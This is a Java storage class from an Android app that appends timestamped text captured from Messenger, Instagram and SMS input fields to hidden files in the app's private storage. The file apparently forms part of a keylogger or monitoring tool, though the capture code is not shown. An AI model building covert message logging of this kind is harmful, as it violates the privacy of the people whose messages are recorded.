package androidaid.android.com.androidaid.storage;

import android.content.Context;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.util.ArrayList;

import androidaid.android.com.androidaid.core.FileUtils;
import androidaid.android.com.androidaid.program_flow.Constants;
import androidaid.android.com.androidaid.utilities.StringUtils;

/**
 * This class provides functionality for writing to the internal storage of the device
 */
public class InternalStorageManager {
    private static Context systemContext;
    private static File internalStorageAppDirectory;

    private static ArrayList<String> allInternalStorageFilePaths;

    private InternalStorageManager() {

    }

    /**
     * Initializes InternalStorageManager. It is obligatory to call this method, otherwise this class won't work
     * @param c
     */
    public static void initialize(Context c) {
        systemContext = c;
        internalStorageAppDirectory = c.getFilesDir();

        allInternalStorageFilePaths = new ArrayList<>();
        allInternalStorageFilePaths.add(Constants.STORAGE_FIELD_TEXT_MESSENGER);
        allInternalStorageFilePaths.add(Constants.STORAGE_FIELD_TEXT_INSTAGRAM);
        allInternalStorageFilePaths.add(Constants.STORAGE_FIELD_TEXT_SMS);
        allInternalStorageFilePaths.add(Constants.STORAGE_GENERAL_TEXT_FILE_LOCATION);
    }

    /**
     * Creates a new file inside the app's internal storage location
     * @param fileName
     */
    public static void createNewFile(String fileName) {
        File file = new File(internalStorageAppDirectory, fileName);
    }

    /**
     * Writes text to the file specified by fileName by MODE.APPEND
     * @param fileName
     * @param text
     */
    public static void writeTextToFile(String fileName, String text) {
        System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Writing text to file " + fileName);
        FileOutputStream outputStream;

        String modifiedText = Constants.STORAGE_TEXT_STARTEND_SEPARATOR + text + Constants.STORAGE_TEXT_STARTEND_SEPARATOR;

        try {
            outputStream = systemContext.openFileOutput(fileName, Context.MODE_APPEND); //this makes the file output string append (and not overwrite) data.

            //outputStream.write(text.getBytes());
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(outputStream));
            bw.newLine();
            bw.write(modifiedText);

            bw.close();
            outputStream.close();
            System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " successful.");
        } catch (Exception e) {
            System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " FAILED!");
            e.printStackTrace();
        }
    }

    public static void writeTextToFile(String fileName, String text, int mode) {
        FileOutputStream outputStream;

        try {
            outputStream = systemContext.openFileOutput(fileName, mode); //this makes the file output string append (and not overwrite) data.

            //outputStream.write(text.getBytes());
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(outputStream));
            bw.write(text);

            bw.close();
            outputStream.close();
            System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " successful.");
        } catch (Exception e) {
            System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " FAILED!");
            e.printStackTrace();
        }
    }

    /**
     * Reads the file specified by fileName and returns its contents represented as a String
     * @param fileName
     * @return
     */
    public static String readFromFile(String fileName) {
        System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Reading from file: " + fileName);

        FileInputStream inputStream;
        try {
            inputStream = systemContext.openFileInput(fileName);

            StringBuilder sb = new StringBuilder();
            String line = null;
            try (BufferedReader br = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"))) {
                while((line = br.readLine()) != null) {
                    sb.append(line);
                }
            }

            return sb.toString();

        } catch (Exception e) {
            System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Encountered an error while opening an input stream to file: " + fileName);
            e.printStackTrace();
            return null;
        }
    }

    public static String readFromFile(File file) {
        System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Reading from file: " + file.getAbsolutePath());

        FileInputStream inputStream;
        try {
            //todo: THIS MAY BE WRONG!!!
            inputStream = systemContext.openFileInput(FileUtils.getRelativePath(file));

            StringBuilder sb = new StringBuilder();
            String line = null;
            try (BufferedReader br = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"))) {
                while((line = br.readLine()) != null) {
                    sb.append(line);
                }
            }

            return sb.toString();

        } catch (Exception e) {
            System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Encountered an error while opening an input stream to file: " + file.getAbsolutePath());
            e.printStackTrace();
            return null;
        }
    }

    /**
     * Deletes all of the file contents of the specified file
     * @param fileName
     * @return
     */
    public static void deleteFileContents(String fileName) {
        System.out.println("[sproc32.storage.InternalstorageManager.readFromFile]: Deleting file contents.");
        writeTextToFile(fileName, "", Context.MODE_PRIVATE);
    }

    //todo: in the future include also the recipient
    public static void writeToInstagramFieldTextFile(String dateAndTime, String text) {
        if(StringUtils.checkIfNotForbidden(text, Constants.DATABASE_FORBIDDEN_FIELD_TEXT_VALUES)) {
            System.out.println("[sproc32.ISM]: Writing text '" + text + "' to instagram field text file.");
            String modified = dateAndTime + Constants.STORAGE_TEXT_SEMISEPARATOR + text;
            writeTextToFile(Constants.STORAGE_FIELD_TEXT_INSTAGRAM, modified);
        }
    }

    public static void writeToMessengerFieldTextFile(String dateAndTime, String text) {
        if (StringUtils.checkIfNotForbidden(text, Constants.DATABASE_FORBIDDEN_FIELD_TEXT_VALUES)) {
            System.out.println("[sproc32.ISM]: Writing text '" + text + "' to messenger field text file.");
            String modified = dateAndTime + Constants.STORAGE_TEXT_SEMISEPARATOR + text;
            writeTextToFile(Constants.STORAGE_FIELD_TEXT_MESSENGER, modified);
        }
    }

    public static void writeToSMSFieldTextFile(String dateAndTime, String text) {
        if (StringUtils.checkIfNotForbidden(text, Constants.DATABASE_FORBIDDEN_FIELD_TEXT_VALUES)) {
            System.out.println("[sproc32.ISM]: Writing text '" + text + "' to SMS field text file.");
            String modified = dateAndTime + Constants.STORAGE_TEXT_SEMISEPARATOR + text;
            writeTextToFile(Constants.STORAGE_FIELD_TEXT_SMS, modified);
        }
    }

    /**
     * Writes to the file where all of the text is cluttered.
     * @param dateAndTime
     * @param text
     * @param source Should be Constants.SOURCE_MESSENGER, Constants.SOURCE_INSTAGRAM or Constants.SOURCE_SMS
     */
    public static void writeToFieldTextGeneralFile(String dateAndTime, String text, String source) {
        if (StringUtils.checkIfNotForbidden(text, Constants.DATABASE_FORBIDDEN_FIELD_TEXT_VALUES)) {
            System.out.println("[sproc32.ISM]: Writing text '" + text + "' from source '" + source + "' to general text file.");
            String modified = source + Constants.STORAGE_TEXT_SEMISEPARATOR + dateAndTime + Constants.STORAGE_TEXT_SEMISEPARATOR + text;
            writeTextToFile(Constants.STORAGE_GENERAL_TEXT_FILE_LOCATION, modified);
        }
    }

    /**
     * Checks whether the files in internal storage are empty (ie, contain 0 lines)
     * @return True, if all of the files on internal storage are empty. False otherwise.
     */
    public static boolean checkInternalStorageStateEmpty() {
        System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: Checking internal storage space.");

        boolean databaseIsEmpty = true;

        for (File file : getAllInternalStorageFiles()) {
            if(file.length() != 0) {
                System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: Internal storage space isn't empty! File " + file.getAbsolutePath() + " contains some text. Other files may contain text as well!");
                databaseIsEmpty = false;
                break;
            } else {
                System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: File " + file.getAbsolutePath() + " is empty.");
            }
        }

        System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: Returning " + databaseIsEmpty);
        return databaseIsEmpty;
    }

    /**
     *
     * @return All of the files on internal storage in a File array
     */
    public static ArrayList<File> getAllInternalStorageFiles() {
        ArrayList<File> files = new ArrayList<>();

        for(String s : allInternalStorageFilePaths) {
            File file = new File(internalStorageAppDirectory, s);
            files.add(file);
        }

        System.out.println("[sproc32.InternalStoragemanager.getAllInternalStorageFiles]: Parsed internal storage files. Total files: " + files.size());
        return files;
    }
}
